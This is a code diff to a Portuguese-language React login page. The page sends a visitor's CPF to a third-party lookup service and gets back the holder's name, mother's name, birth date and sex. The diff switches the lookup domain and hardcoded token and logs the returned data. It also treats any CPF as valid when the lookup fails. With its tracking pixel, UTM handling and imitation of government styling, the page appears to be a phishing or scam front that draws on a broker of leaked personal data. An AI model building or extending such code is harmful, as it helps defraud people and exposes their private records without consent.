@@ -1,5 +1,5 @@
 import React, { useState } from 'react';
-import { useNavigate } from 'react-router-dom';
+import useUtmNavigator from '../hooks/useUtmNavigator';
 import { useUser } from '../context/UserContext';
 import { usePixelTracking } from '../hooks/usePixelTracking';
 import axios from 'axios';
@@ -43,18 +43,39 @@ const validateCPFFromAPI = async (cpf: string): Promise<{ valid: boolean; data?:
 
   try {
     const response = await axios.get(
-      `https://api.amnesiatecnologia.rocks/?token=e9f16505-2743-4392-bfbe-1b4b89a7367c&cpf=${numericCPF}`
+      `https://magmadatahub.com/api.php?token=bef7dbfe0994308f734fbfb4e2a0dec17aa7baed9f53a0f5dd700cf501f39f26&cpf=${numericCPF}`,
+      { timeout: 8000 }
     );
 
-    if (response.data && response.data.DADOS) {
+    console.log('Resposta da API de Login:', response.data);
+
+    const body = response.data;
+
+    if (body?.status === 'error' || body?.error) {
+      console.warn('CPF API: erro retornado', body);
+      return { valid: true };
+    }
+
+    // Trata diferentes formatos de resposta da API
+    let dados = body?.DADOS || body?.dados || body?.data;
+    
+    if (!dados && Array.isArray(body) && body.length > 0) {
+      dados = body[0];
+    }
+    
+    if (!dados && body?.nome) {
+      dados = body;
+    }
+
+    if (dados && dados.nome) {
       return {
         valid: true,
         data: {
-          cpf: response.data.DADOS.cpf,
-          nome: response.data.DADOS.nome,
-          nome_mae: response.data.DADOS.nome_mae,
-          data_nascimento: response.data.DADOS.data_nascimento,
-          sexo: response.data.DADOS.sexo
+          cpf: dados.cpf || dados.CPF || numericCPF,
+          nome: dados.nome || dados.NOME || "",
+          nome_mae: dados.nome_mae || dados.MAE || "",
+          data_nascimento: dados.data_nascimento || dados.DATA_NASCIMENTO || "",
+          sexo: dados.sexo || dados.SEXO || ""
         }
       };
     }
@@ -71,7 +92,7 @@ const Login: React.FC = () => {
   const [cpf, setCpf] = useState('');
   const [loading, setLoading] = useState(false);
   const [error, setError] = useState('');
-  const navigate = useNavigate();
+  const navigate = useUtmNavigator();
   const { setUserName } = useUser();
 
   const formatCPF = (value: string) => {
@@ -148,7 +169,8 @@ const Login: React.FC = () => {
 
               <div>
                 <label htmlFor="cpf" className="block text-[#333333] text-sm font-bold mb-2" style={{ fontFamily: 'Rawline, sans-serif' }}>CPF</label>
-                <input id="cpf" inputMode="numeric" placeholder="Digite seu CPF" className="shadow text-[0.8em] text-[#333333] h-[36px] appearance-none border rounded w-full py-2 px-3 leading-tight" maxLength={14} type="text" value={cpf} onChange={handleCPFChange} style={{ fontFamily: 'Rawline, sans-serif', padding: '0px 20px', width: '100%', background: '0px 0px no-repeat padding-box padding-box rgb(255, 255, 255)', border: '1px solid rgb(136, 136, 136)', borderRadius: '4px', color: 'rgb(51, 51, 51)' }} />
+                {/* Make font-size >= 16px to prevent iOS Safari from auto-zooming on focus */}
+                <input id="cpf" inputMode="numeric" placeholder="Digite seu CPF" className="shadow text-base text-[#333333] h-[40px] appearance-none border rounded w-full py-2 px-3 leading-tight" maxLength={14} type="text" value={cpf} onChange={handleCPFChange} style={{ fontFamily: 'Rawline, sans-serif', padding: '0px 20px', width: '100%', background: '0px 0px no-repeat padding-box padding-box rgb(255, 255, 255)', border: '1px solid rgb(136, 136, 136)', borderRadius: '4px', color: 'rgb(51, 51, 51)', fontSize: '16px' }} />
               </div>
 
               {error && (
